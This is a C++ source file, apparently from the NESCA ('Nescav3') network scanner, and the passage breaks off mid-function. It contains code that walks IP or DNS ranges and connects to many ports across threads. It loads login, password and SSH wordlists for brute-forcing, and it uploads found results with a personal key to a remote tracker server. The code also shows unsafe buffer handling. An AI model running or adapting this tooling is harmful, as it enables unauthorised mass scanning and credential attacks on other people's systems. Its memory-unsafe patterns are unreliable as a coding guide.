#include "STh.h"
#include "mainResources.h"
#include "externData.h"
#include "externFunctions.h"
#include "Connector.h"
#include "Threader.h"
#include <thread>

QJsonArray *jsonArr = new QJsonArray();

bool gShuffle = true;
bool __savingBackUpFile = false;
bool horLineFlag = false;
static int portArr[65536] = {0};
int gThreadDelay = 10;
int gC = 0;
int gTimeOut = 3;
int PieAnomC1 = 0, PieBA = 0, PieSusp = 0, PieLowl = 0, PieWF = 0, PieSSH = 0;
int AnomC1 = 0, Filt = 0, Overl = 0, Lowl = 0, Alive = 0, saved = 0, Susp = 0, WF = 0, offlines = 0, ssh = 0;
int GlobalNegativeSize = 0;
int ipCounter = 0;
int mode;
int found = 0, indexIP = 1;
int gMode;
int MaxPass = 0, MaxLogin = 0, MaxTags = 0, MaxWFLogin = 0, MaxWFPass = 0, MaxSSHPass = 0;
int ipsstart[4], ipsend[4], 
	overallPorts, flCounter, octet[4];
int BA = 0;
int gPingTimeout = 1;
unsigned int Activity = 0;

unsigned char **ipsstartfl = NULL, **ipsendfl = NULL, **starterIP = NULL;
double ips = 0;
char top_level_domain[128] = {0};
char **GlobalNegatives = 0;
char **loginLst, **passLst;
char **wfLoginLst, **wfPassLst;
char **sshlpLst;
char saveEndIP[128] = {0};
char gRange[128] = {0};
char gFirstDom[128] = {0};
char gPorts[65536] = {0};
char metaRange[256] = {0};
char metaPercent[256] = {0};
char metaIPS[256] = {0};
char metaTargets[256] = {0};
char metaETA[256] = {0};
char metaOffline[256] = {0};

char currentIP[MAX_ADDR_LEN] = {0};
char finalIP[32] = {0};

bool ErrLogFirstTime = true;
bool gPingNScan = false;
long long unsigned int gTargets = 0, gTargetsOverall = 1, targets;
volatile int gThreads;
volatile int cons = 0;
volatile int BrutingThrds = 0;
volatile int threads = 20;

void SaveErrorLog(char *sender, char *MesSent, char *ReplRecv)
{
	FILE *errFile = fopen("./logs/ns-track_errors.html", "r");
	if(errFile != NULL)
	{
		fclose(errFile);
	};
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
	CreateDirectory(L"./logs", NULL);
#else
	struct stat st = {0};
	if (stat("./logs", &st) == -1) {
		mkdir("./logs", 0700);
	}
#endif
	time_t rtime;
	time(&rtime);
	char cdate[32] = {0};
	strcpy (cdate, ctime (&rtime));

	char *totalErrLog = NULL;
	char stylePart[] = {"<style>html{background-color:#373737;}#mainblock{background-color:#646464;width:100%;border:1px dotted black;}#sender-time{color:#ffffff;}#msr{color:#b9b9b9;}#msc{width:99,8%;border:1px solid black;}pre{width:99,8%;border:1px solid gray;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;white-space:pre-wrap;word-wrap:break-word;}</style>"};
	char firstPart[] = {"<div id=\"mainblock\"><div id=\"sender-time\">"};
	char secondPart[] = {"</div><span id=\"msr\">Message sent:</span><pre>"};
	char thirdPart[] = {"</pre><span id=\"msr\">Reply received:</span><pre><iframe width=\"100%\" height=\"600px\" id=\"msc\" src=\"data:text/html;base64,"};
	char forthPart[] = {"\"></iframe></pre></div>"};
	
	int sz = strlen(stylePart) + strlen(firstPart) + strlen(secondPart) + strlen(thirdPart) + strlen(forthPart) + strlen(QByteArray(MesSent).replace("\r\n", "\n").data()) + (strlen(ReplRecv) + 50*strlen(ReplRecv)/100) + strlen(cdate) + strlen(sender);

	totalErrLog = new char[sz + 4];
	ZeroMemory(totalErrLog, sz);
	if(ErrLogFirstTime) strcat(totalErrLog, stylePart);
	strcat(totalErrLog, firstPart);
	strcat(totalErrLog, sender);
	strcat(totalErrLog, " - ");
	strcat(totalErrLog, cdate);
	strcat(totalErrLog, secondPart);
	strcat(totalErrLog, QByteArray(MesSent).replace("\r\n", "\n").data());
	strcat(totalErrLog, thirdPart);
	strcat(totalErrLog, base64_encode((const unsigned char *)ReplRecv, strlen(ReplRecv)).c_str());
	strcat(totalErrLog, forthPart);
	memset(totalErrLog + sz, '\0', 1);

	errFile = fopen("./logs/ns-track_errors.html", "a");
	if(errFile != NULL)	
	{
		fwrite(totalErrLog, sz, 1, errFile);
		fclose(errFile);
	}
	else
	{
		stt->doEmitionRedFoundData("[Log] -Cant open log file!");
	};
	if(totalErrLog != NULL)
	{
		delete []totalErrLog;
		totalErrLog = NULL;
	};
}

QString GetNSErrorDefinition(const char *str, const char *elem)
{
    const char *temp = strstr(str, elem);

	if(temp != NULL)
	{
		char definition[128] = {0};
        const char *firstComma = strstr(temp + strlen(elem) + 1, "\"");
        const char *lastComma = strstr(firstComma + 1, "\"");

		int sz = lastComma - firstComma - 1;

		strncpy(definition, firstComma + 1, (sz < 128 ? sz : 128));

		return QString(definition);
	}
	else return QString("No definition found!");
}

void ConInc()
{
    ++ipCounter;
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
__asm
    {
        lock inc cons;
    };
#else
    asm("lock; incl cons");
#endif

    stt->doEmitionThreads(QString::number(cons) + "/" + QString::number(gThreads));
}

void ConDec()
{
	if(cons > 0)
	{
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
    __asm
        {
            lock dec cons;
        };
#else
        asm("lock; decl cons");
#endif

	};
	
	stt->doEmitionThreads(QString::number(cons) + "/" + QString::number(gThreads));
}

void _SaveBackupToFile()
{
	char saveStr[512] = {0};
    char saveBuffer[4096] = {0};
	char endStr[128] = {0};

	if(gMode == 0 || gMode == 1)
	{
		if(gMode == 1) 
		{
            strcpy(endStr, currentIP);
		}
		else 
		{
            sprintf(endStr, "%s-%s", currentIP, finalIP);
		};

        if(strlen(endStr) > 0)
		{
			strcpy(saveStr, "[SESSION]:");
			strcat(saveStr, std::to_string(gMode).c_str());
            strcat(saveStr, " ");
            strcat(saveStr, endStr);
			if(gMode == 1)
			{
				strcat(saveStr, " ");
				strcat(saveStr, top_level_domain);
			};
			strcat(saveStr, " ");
			strcat(saveStr, std::to_string(gThreads).c_str());
			strcat(saveStr, " ");
			strcat(saveStr, gPorts);

			strcat(saveStr, "\n");
			strcat(saveBuffer, saveStr);
			ZeroMemory(saveStr, sizeof(saveStr));
		};
	}
	else if(gMode == -1)
    {
		char ipRange[128] = {0};

		if(flCounter > 0)
		{
			FILE *savingFile = fopen("tempIPLst.bk", "w");
			if (savingFile != NULL)
			{
				for(int tCounter = gC; tCounter < flCounter; ++tCounter)
                {
                    sprintf(ipRange, "%d.%d.%d.%d-%d.%d.%d.%d\n",
						ipsstartfl[tCounter][0], ipsstartfl[tCounter][1], ipsstartfl[tCounter][2], ipsstartfl[tCounter][3],
						ipsendfl[tCounter][0], ipsendfl[tCounter][1], ipsendfl[tCounter][2], ipsendfl[tCounter][3]);

					fputs(ipRange, savingFile);

                    ZeroMemory(ipRange, sizeof(ipRange));
				};
				fclose(savingFile);
			}
			else stt->doEmitionRedFoundData("[_saver] Cannot open file.");
		};

		strcpy(saveStr, "[SESSION]:");
		strcat(saveStr, std::to_string(gMode).c_str());
		strcat(saveStr, " RESTORE_IMPORT_SESSION");
		strcat(saveStr, " ");
		strcat(saveStr, std::to_string(gThreads).c_str());
		strcat(saveStr, " ");
		strcat(saveStr, gPorts);

		strcat(saveStr, "\n");
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));
	};

		strcpy(saveStr, "[NDBSERVER]:");
		strcat(saveStr, trcSrv);
		strcat(saveStr, "\n");
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));

		strcpy(saveStr, "[NDBSCRIPT]:");
		strcat(saveStr, trcScr);
		strcat(saveStr, "\n");
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));

		strcpy(saveStr, "[NDBPORT]:");
		strcat(saveStr, trcSrvPortLine);
		strcat(saveStr, "\n");
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));

		strcpy(saveStr, "[PROXY]:");
		strcat(saveStr, trcProxy);
		strcat(saveStr, "\n");
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));

		strcpy(saveStr, "[PROXYPORT]:");
		strcat(saveStr, trcPort);
		strcat(saveStr, "\n");
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));

		strcpy(saveStr, "[IRCSERVER]:");
		strcat(saveStr, ircServer);
		strcat(saveStr, "\n");
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));

		strcpy(saveStr, "[IRCPORT]:");
		strcat(saveStr, ircPort);
		strcat(saveStr, "\n");
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));

		strcpy(saveStr, "[IRCPROXY]:");
		strcat(saveStr, ircProxy);
		strcat(saveStr, "\n");
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));

		strcpy(saveStr, "[IRCPROXYPORT]:");
		strcat(saveStr, ircProxyPort);
		strcat(saveStr, "\n");
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));

		strcpy(saveStr, "[IRCNICK]:");
		strcat(saveStr, ircNick);
		strcat(saveStr, "\n");
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));
		
		strcpy(saveStr, "[PING]:");
		strcat(saveStr, gPingNScan ? "true" : "false");
		strcat(saveStr, "\n");
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));

        sprintf(saveStr, "[PING_TO]: %d\n", gPingTimeout);
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));

        sprintf(saveStr, "[THREAD_DELAY]: %d\n", gThreadDelay);
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));

        sprintf(saveStr, "[TIMEOUT]: %d\n", gTimeOut);
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));

        sprintf(saveStr, "[MAXBTHR]: %d\n", gMaxBrutingThreads);
        strcat(saveBuffer, saveStr);
        ZeroMemory(saveStr, sizeof(saveStr));

        sprintf(saveStr, "[SYSTEMPROXYIP]: %s\n", gProxyIP);
        strcat(saveBuffer, saveStr);
        ZeroMemory(saveStr, sizeof(saveStr));

        sprintf(saveStr, "[SYSTEMPROXYPORT]: %s\n", gProxyPort);
        strcat(saveBuffer, saveStr);
        ZeroMemory(saveStr, sizeof(saveStr));

		strcpy(saveStr, "[PERSKEY]:");
        strncat(saveStr, trcPersKey, 32);
		strcat(saveStr, "\n");
		strcat(saveBuffer, saveStr);
		ZeroMemory(saveStr, sizeof(saveStr));
		
		FILE *savingFile = fopen("restore", "w");

		if (savingFile != NULL)
		{	
			fputs(saveBuffer, savingFile);
			fclose(savingFile);
		}
		else stt->doEmitionRedFoundData("[_saver] Cannot open file.");

		ZeroMemory(saveStr, strlen(saveStr));
		ZeroMemory(saveBuffer, strlen(saveBuffer));
}

void _saver()	
{
	while(globalScanFlag)
	{
		__savingBackUpFile = true;
		_SaveBackupToFile();
		__savingBackUpFile = false;
		Sleep(10000);
	};
}

void _timer() {
	char dbuffer[32] = {0}, timeLeft[64] = {0}, b[32] = {0};
	int ticks = 0;
	int ovrlIPs = 0;
	ips = 1;
	Sleep(50);

	while(globalScanFlag)
	{
		++ticks;
		ovrlIPs += ipCounter;
		ipCounter = 0;
		ips = ovrlIPs/ticks;
		strncpy(b, QString::number(ips).toLocal8Bit().data(), 5);

		strcpy(metaIPS, b);
		strcat(timeLeft, b);
		strcat(timeLeft, "/s (");

		if(ips > 0) 
		{
			strncpy(dbuffer, std::to_string(((gTargets + 1)/ips/3600/24)).c_str(), 5);
		}
		else strcpy(dbuffer, "INF");
		strcpy(metaETA, dbuffer);
		strcat(dbuffer, "d)");
		strcat(timeLeft,  (strcmp(dbuffer, "1.$d)") == 0 ? "INF)" : dbuffer));


		stt->doEmitionIPS(QString(timeLeft));
		stt->doEmitionOffline(QString::number(offlines));

		ZeroMemory(timeLeft, sizeof(timeLeft));
		ZeroMemory(dbuffer, sizeof(dbuffer));
		Sleep(1000);
	};
}

void _tracker() {
    while(true) {
        while(!trackerOK) Sleep(1000);

        if(!globalScanFlag && jsonArr->size() == 0) break;
        char rBuffT[250000] = {0};
        char *msg = new char[4096];
        ZeroMemory(msg, sizeof(*msg));
        char ndbServer[64] = {0};
        char ndbScriptT[64] = {0};
        char ndbScript[64] = {0};

        sockaddr_in sockAddr;
        sockAddr.sin_family = AF_INET;
        sockAddr.sin_port = htons(atoi(trcSrvPortLine));

        strcpy(msg, "GET /");
        strcat(msg, trcScr);
        strcat(msg, " HTTP/1.1\r\nHost: ");
        strcat(msg, trcSrv);
        strcat(msg, "\r\nX-Nescav3: True\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n");

        HOSTENT *host;

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
        if(inet_addr(trcSrv) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(trcSrv);
        else if(host=gethostbyname (trcSrv)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
#else
        if(inet_addr(trcSrv) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(trcSrv);
        else if(host=gethostbyname (trcSrv)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
#endif
        SOCKET sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );

        if(connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr)) == -1)
        {
            CSSOCKET(sock);

            stt->doEmitionRedFoundData("[NS-Track] -Cannot connect to balancer! " + QString::number(WSAGetLastError()) + ".");

            continue;
        };

        if(send(sock, msg, strlen(msg), 0) == -1)
        {
            CSSOCKET(sock);

            stt->doEmitionRedFoundData("[NS-Track] -Cannot send to balancer! " + QString::number(WSAGetLastError()) + ".");

            continue;
        };

        ZeroMemory(rBuffT, sizeof(rBuffT));
        char rBuff[512] = {0};
        int test = recv(sock, rBuff, sizeof(rBuff), 0);
        strcpy(rBuffT, rBuff);

        while((test = recv(sock, rBuff, sizeof(rBuff), 0)) != 0)
        {
            if(strlen(rBuffT) > 200000)
            {
                stt->doEmitionRedFoundData("[NS-Track] (Outer) -Large error received from server (>200000b) " + QString::number(WSAGetLastError()) + ".");
                SaveErrorLog("NS-Track", msg, rBuffT);
                break;
            };
            strcat(rBuffT, rBuff);
        };

        if(test == -1)
        {
            CSSOCKET(sock);

            stt->doEmitionRedFoundData("[NS-Track] -Cannot recv from balancer! " + QString::number(WSAGetLastError()) + ".");

            continue;
        };

        char *t1;
        char *t2;
        if(strstr(rBuffT, "http://") != NULL)
        {
            t1 = strstr(rBuffT, "http://");
            if(strstr((char*)(t1 + 7), "/") != NULL)
            {
                t2 = strstr((char*)(t1 + 7), "/");
                int ln = t2 - t1 - 7;
                if(ln > 64)
                {
                    CSSOCKET(sock);

                    stt->doEmitionRedFoundData("[NS-Track] -Received server string is not valid!");
                    SaveErrorLog("NS-Track", msg, rBuffT);

                    continue;
                }
                else strncpy(ndbServer, (char*)(t1 + 7), ln);

                if(strlen(t2) > 64)
                {

                    stt->doEmitionYellowFoundData("[NS-Track] -Fragmentation detected!");

                    if(strstr(t2, "\r\n") != NULL)
                    {
                        char *t3 = strstr(t2, "\r\n");
                        int y = (int)(t3 - t2);

                        if(y > 64)
                        {
                            CSSOCKET(sock);

                            stt->doEmitionRedFoundData("[NS-Track] -Received server string is not valid!");

                            SaveErrorLog("NS-Track", msg, rBuffT);
                            continue;
                        }
                        else
                        {
                            strncpy(ndbScriptT, t2, y);
                            CSSOCKET(sock);

                            stt->doEmitionGreenFoundData("[NS-Track] -OK! -Fragmented server string aquired! Starting NS-Track loop...");

                            strncpy(ndbScript, ndbScriptT, strlen(ndbScriptT) );
                        };
                    }
                    else
                    {
                        CSSOCKET(sock);

                        stt->doEmitionRedFoundData("[NS-Track] -Received server string is not valid!");

                        SaveErrorLog("NS-Track", msg, rBuffT);
                        continue;
                    };
                }
                else
                {
                    strcpy(ndbScriptT, t2);

                    stt->doEmitionGreenFoundData("[NS-Track] -OK! -Server string aquired! Starting NS-Track loop...");

                    CSSOCKET(sock);
                    strncpy(ndbScript, ndbScriptT, strlen(ndbScriptT) - 2 );
                };
            }
            else
            {
                CSSOCKET(sock);

                stt->doEmitionRedFoundData("[NS-Track] -Cannot receive script value!");

                continue;
            };

            ZeroMemory(rBuffT, sizeof(rBuffT));
            CSSOCKET(sock);

            while(true)
            {
                if(!globalScanFlag && jsonArr->size() == 0) break;
                if(!trackerOK) {
                    Sleep(1000);
                    continue;
                };

                if(jsonArr->size() > 0)
                {
                    QJsonObject jsonKey;
                    if(jsonArr == NULL) jsonArr = new QJsonArray();

                    QJsonObject jsonMeta;
                    if(mode == 0) jsonMeta.insert("mode", QJsonValue(QString("IP")));				//
                    else if(mode == 1) jsonMeta.insert("mode", QJsonValue(QString("DNS")));			//Mode
                    else if(mode == -1) jsonMeta.insert("mode", QJsonValue(QString("Import")));		//
                    jsonMeta.insert("range", QJsonValue(QString(metaRange)) );
                    jsonMeta.insert("current", QJsonValue(QString(currentIP)) );
                    if(mode == 1) jsonMeta.insert("tld", QJsonValue(QString(top_level_domain)));			//TLD
                    jsonMeta.insert("targets", QJsonValue(QString(metaTargets)) );
                    jsonMeta.insert("percent", QJsonValue(QString(metaPercent)) );
                    jsonMeta.insert("saved", QJsonValue(QString::number(saved)) );
                    jsonMeta.insert("found", QJsonValue(QString::number(found)) );
                    jsonMeta.insert("speed", QJsonValue(QString(metaIPS)) );
                    jsonMeta.insert("eta", QJsonValue(QString(metaETA)) );
                    jsonMeta.insert("threads", QJsonValue(QString::number(cons) + "/" + QString::number(gThreads)) );
                    jsonMeta.insert("bads", QJsonValue(QString::number(offlines)) );
                    jsonMeta.insert("version", QJsonValue(QString(gVER)) );

                    jsonArr->push_front(QJsonValue(jsonMeta) );
                    memset(trcPersKey + 32, '\0', 1);
                    jsonKey.insert("key", QJsonValue(QString(trcPersKey)) );
                    jsonArr->push_front(jsonKey);

                    QJsonDocument js;
                    js.setArray(*jsonArr);
                    QByteArray r = js.toJson();

                    sockAddr.sin_family = AF_INET;
                    sockAddr.sin_port = htons(atoi(trcSrvPortLine));

                    if(msg != NULL)
                    {
                        delete []msg;
                        msg = 0;
                    };

                    msg = new char[r.size() + 1024];
                    ZeroMemory(msg, sizeof(*msg));

                    strcpy(msg, "POST /");
                    strcat(msg, ndbScript);
                    strcat(msg, " HTTP/1.1\r\nHost: ");
                    strcat(msg, ndbServer);
                    strcat(msg, "\r\nContent-Type: application/json\r\nAccept-Encoding: application/json\r\nContent-Length: ");
                    strcat(msg, std::to_string(r.size()).c_str());
                    strcat(msg, "\r\nConnection: close\r\n\r\n");

                    strcat(msg, r.data());

                    delete jsonArr;
                    jsonArr = new QJsonArray();

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
                    if(inet_addr(ndbServer) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ndbServer);
                    else if(host=gethostbyname (ndbServer)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
#else
                    if(inet_addr(ndbServer) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ndbServer);
                    else if(host=gethostbyname (ndbServer)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
#endif
                    sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );

                    if(gDebugMode)
                    {
                        stt->doEmitionDebugFoundData("Connecting to " + QString(ndbServer));
                    };

                    if(connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr)) == -1)
                    {
                        CSSOCKET(sock);


                        stt->doEmitionRedFoundData("[NS-Track] -connect() returned " + QString::number(WSAGetLastError()) + ".");

                        continue;
                    };

                    if(gDebugMode)
                    {
                        stt->doEmitionDebugFoundData("Sending!");
                        stt->doEmitionDebugFoundData("Key: [" + QString(trcPersKey) + "]");
                        stt->doEmitionDebugFoundData("MSG: [" + QString(msg) + "]");
                    };

                    if(send(sock, msg, strlen(msg), 0) == -1)
                    {
                        CSSOCKET(sock);

                        stt->doEmitionRedFoundData("[NS-Track] -send() returned " + QString::number(WSAGetLastError()) + ".");

                        SaveErrorLog("NS-Track", msg, "");
                        continue;
                    };

                    ZeroMemory(rBuffT, sizeof(rBuffT));
                    char msgR[32] = {0};

                    if(gDebugMode)
                    {
                        stt->doEmitionDebugFoundData("Receiving...");
                    };

                    test = recv(sock, rBuff, 512, 0);

                    if(gDebugMode)
                    {
                        stt->doEmitionDebugFoundData("Received: " + QString(rBuff));
                    };

                    strncpy(msgR, rBuff, 32);
                    strcpy(rBuffT, rBuff);
                    while(test > 0)
                    {
                        if(test <= 0) break;

                        if(strlen(rBuffT) > 200000)
                        {
                            stt->doEmitionRedFoundData("[NS-Track] (Inner) -Large error received from server (>200000b) " + QString::number(WSAGetLastError()) + ".");
                            SaveErrorLog("NS-Track", msg, rBuffT);
                            break;
                        };
                        strcat(rBuffT, rBuff);
                        test = recv(sock, rBuff, 512, 0);
                        if(gDebugMode)
                        {
                            stt->doEmitionDebugFoundData("Received: " + QString(rBuff));
                        };
                    };

                    if(test == -1)
                    {
                        CSSOCKET(sock);

                        stt->doEmitionRedFoundData("[NS-Track] -recv() returned " + QString::number(WSAGetLastError()) + ".");

                        SaveErrorLog("NS-Track", msg, "");
                        continue;
                    };

                    if(strstr(rBuffT, "201 Created") != NULL)
                    {

                        if(gDebugMode) stt->doEmitionYellowFoundData("[NS-Track] -OK. Data saved!");
                        stt->doEmitionDataSaved(true);
                        Sleep(1000);
                        stt->doEmitionDataSaved(false);

                    }
                    else if(strstr(rBuffT, "400 Bad Request") != NULL)
                    {

                        QString errorDef = GetNSErrorDefinition(rBuffT, "notify");
                        if(errorDef == "Invalid access key") stt->doEmitionYellowFoundData("[NS-Track] [Key is unauthorized] A valid key is required.");
                        else stt->doEmitionYellowFoundData("[NS-Track] -FAIL! [400 Bad Request : " + errorDef + "]");

                        SaveErrorLog("NS-Track", msg, rBuffT);
                    }
                    else
                    {
                        stt->doEmitionYellowFoundData("[NS-Track] -FAIL! An error occured [" + QString(msgR) + "]");
                        SaveErrorLog("NS-Track", msg, rBuffT);
                    };

                    ZeroMemory(msgR, sizeof(msgR));
                    ZeroMemory(rBuffT, sizeof(rBuffT));
                    ZeroMemory(msg, sizeof(*msg));

                    if(msg != NULL)
                    {
                        delete msg;
                        msg = NULL;
                    };

                    CSSOCKET(sock);
                };
                Sleep(10000);
            };
        }
        else
        {
            stt->doEmitionRedFoundData("[NS-Track] -Balancer replied with invalid string.");
            SaveErrorLog("NS-Track", msg, rBuffT);
        };

        CSSOCKET(sock);
    }
}

unsigned long int numOfIps(int ipsstart[], int ipsend[]) {
	gTargets += 16777216 * (ipsend[0] - ipsstart[0]);
	gTargets += 65536 * (ipsend[1] - ipsstart[1]);
	gTargets += 256 * (ipsend[2] - ipsstart[2]);
	gTargets += (ipsend[3] - ipsstart[3]);
	gTargetsOverall = gTargets - 1;

	//unsigned long ip1 = (ipsstart[0] * 16777216) + (ipsstart[1] * 65536) + (ipsstart[2] * 256) + ipsstart[3];
	//unsigned long ip2 = (ipsend[0] * 16777216) + (ipsend[1] * 65536) + (ipsend[2] * 256) + ipsend[3];
	//unsigned long gTargets = ip2 - ip1;

	return gTargets;
}

void _connect() {
    string ip = "";
	while (globalScanFlag) {
		std::unique_lock<std::mutex> lk(Threader::m);
		Threader::cv.wait(lk, []{return Threader::ready; });
		if (Threader::threadId > gThreads || !globalScanFlag) {
			--Threader::threadId;
			Threader::ready = false;
			lk.unlock();
			return;
		}

		if (!Threader::ipQueue.empty()) {
			ip = Threader::ipQueue.front();
			Threader::ipQueue.pop();
			Threader::ready = false;
			lk.unlock();

			if (ip.size() == 0) return;

			ConInc();
			for (int i = 0; i <= overallPorts; ++i)
			{
                if (!globalScanFlag) break;
				if (Connector::_ConnectToPort(ip, portArr[i], "") == -2) break;
			};
			ConDec();
		}
    }
}

inline void progressOutput(long long unsigned int target) {
    char targetNPers[128] = {0};
    float percent = (gTargetsOverall != 0 ? (100 - target/(double)gTargetsOverall * 100) : 0);

    sprintf(targetNPers, "%Lu (%.1f%%)", target, percent);
    stt->doEmitionTargetsLeft(QString(targetNPers));

    sprintf(metaTargets, "%Lu", target);
    sprintf(metaPercent, "%.1f",
            percent);
}
void verboseProgress(long long unsigned int target, const char *ip) {

    stt->doEmitionIPRANGE(QString(ip));
    progressOutput(target);
}
void verboseProgressDNS(long long unsigned int target, const char *ip, const char *TLD) {

    stt->doEmitionIPRANGE(QString(ip) + QString(TLD));
    progressOutput(target);
}

void _passLoginLoader() {
	MaxLogin = 0;
	MaxPass = 0;

	char buffFG[32] = {0};
	int i = 0;

    FILE *loginList = fopen("login.txt", "r");
    FILE *passList = fopen("pass.txt", "r");

	if(passList != NULL && loginList != NULL)
	{
		while(fgets(buffFG, 32, loginList) != NULL)
		{
			MaxLogin++;
			ZeroMemory(buffFG, sizeof(buffFG));
		};

		while(fgets(buffFG, 32, passList) != NULL)
		{
			MaxPass++;
			ZeroMemory(buffFG, sizeof(buffFG));
		};

		rewind(loginList);
		rewind(passList);

		loginLst = new char*[MaxLogin];
		passLst = new char*[MaxPass];

		for(int j = 0; j < MaxLogin; j++)
		{
			loginLst[j] = new char[32];
		};

		for(int j = 0; j < MaxPass; j++)
		{
			passLst[j] = new char[32];
		};

		while(fgets(buffFG, 32, passList) != NULL)
		{
			memset(passLst[i], 0, strlen(buffFG) + 1);

			if(strstr(buffFG, "\n") != NULL) strncat(passLst[i++], buffFG, strlen(buffFG) - 1);
			else  strncat(passLst[i++], buffFG, strlen(buffFG));
			ZeroMemory(buffFG, sizeof(buffFG));
		};

        stt->doEmitionGreenFoundData("Password list loaded (" + QString::number(MaxPass) + " entries)");
	
		i = 0;

		while(fgets(buffFG, 32, loginList) != NULL)
		{
			memset(loginLst[i], 0, strlen(buffFG) + 1);

			if(strstr(buffFG, "\n") != NULL) strncat(loginLst[i++], buffFG, strlen(buffFG) - 1);
			else strncat(loginLst[i++], buffFG, strlen(buffFG));
			ZeroMemory(buffFG, sizeof(buffFG));
		};
		
        stt->doEmitionGreenFoundData("Login list loaded (" + QString::number(MaxLogin) + " entries)");
		
		fclose(loginList);
		fclose(passList);
	} 
	else 
    {
		stt->doEmitionRedFoundData("No password/login list found");
        stt->doEmitionKillSttThread();
	};

	MaxWFLogin = 0;
	MaxWFPass = 0;

	FILE *wfLoginList;
	FILE *wfPassList;
	
	ZeroMemory(buffFG, sizeof(buffFG));
	i = 0;

	wfLoginList = fopen("wflogin.txt", "r");
	wfPassList = fopen("wfpass.txt", "r");

	if(wfPassList != NULL && wfLoginList != NULL)
	{
		while(fgets(buffFG, 32, wfLoginList) != NULL)
		{
			MaxWFLogin++;
			ZeroMemory(buffFG, sizeof(buffFG));
		};

		while(fgets(buffFG, 32, wfPassList) != NULL)
		{
			MaxWFPass++;
			ZeroMemory(buffFG, sizeof(buffFG));
		};

		rewind(wfLoginList);
		rewind(wfPassList);

		wfLoginLst = new char*[MaxWFLogin];
		wfPassLst = new char*[MaxWFPass];

		for(int j = 0; j < MaxWFLogin; j++)
		{
			wfLoginLst[j] = new char[32];
		};

		for(int j = 0; j < MaxWFPass; j++)
		{
			wfPassLst[j] = new char[32];
		};

		while(fgets(buffFG, 32, wfPassList) != NULL)
		{
			memset(wfPassLst[i], 0, strlen(buffFG) + 1);

			if(strstr(buffFG, "\n") != NULL) strncat(wfPassLst[i++], buffFG, strlen(buffFG) - 1);
			else strncat(wfPassLst[i++], buffFG, strlen(buffFG));
			ZeroMemory(buffFG, sizeof(buffFG));
		};

        stt->doEmitionGreenFoundData("WFPassword list loaded (" + QString::number(MaxWFPass) + " entries)");
	
		i = 0;

		while(fgets(buffFG, 32, wfLoginList) != NULL)
		{
			memset(wfLoginLst[i], 0, strlen(buffFG) + 1);

			if(strstr(buffFG, "\n") != NULL) strncat(wfLoginLst[i++], buffFG, strlen(buffFG) - 1);
			else strncat(wfLoginLst[i++], buffFG, strlen(buffFG));
			ZeroMemory(buffFG, sizeof(buffFG));
		};

        stt->doEmitionGreenFoundData("WFLogin list loaded (" + QString::number(MaxWFLogin) + " entries)");
        fclose(wfPassList);
        fclose(wfLoginList);
	} 
	else 
    {
		stt->doEmitionRedFoundData("No password/login list found");
        stt->doEmitionKillSttThread();
	};

	MaxSSHPass = 0;
	FILE *sshlpList;
	ZeroMemory(buffFG, sizeof(buffFG));
	i = 0;

	sshlpList = fopen("sshpass.txt", "r");

	if(sshlpList != NULL)
	{
		while(fgets(buffFG, 32, sshlpList) != NULL)
		{
			++MaxSSHPass;
			ZeroMemory(buffFG, sizeof(buffFG));
		};

		rewind(sshlpList);

		sshlpLst = new char*[MaxSSHPass];

		for(int j = 0; j < MaxSSHPass; j++)
		{
			sshlpLst[j] = new char[32];
		};

		while(fgets(buffFG, 32, sshlpList) != NULL)
		{
			memset(sshlpLst[i], 0, strlen(buffFG) + 1);

			if(strstr(buffFG, "\n") != NULL) strncat(sshlpLst[i++], buffFG, strlen(buffFG) - 1);
			else strncat(sshlpLst[i++], buffFG, strlen(buffFG));
			ZeroMemory(buffFG, sizeof(buffFG));
		};

        stt->doEmitionGreenFoundData("SSH Password list loaded (" + QString::number(MaxSSHPass) + " entries)");
	
		fclose(sshlpList);
	} 
	else 
    {
		stt->doEmitionRedFoundData("No password/login list found");
		stt->doEmitionKillSttThread();
	};
}

void ReadUTF8(FILE* nFile, char *cp) {
	char buffFG[256] = {0};
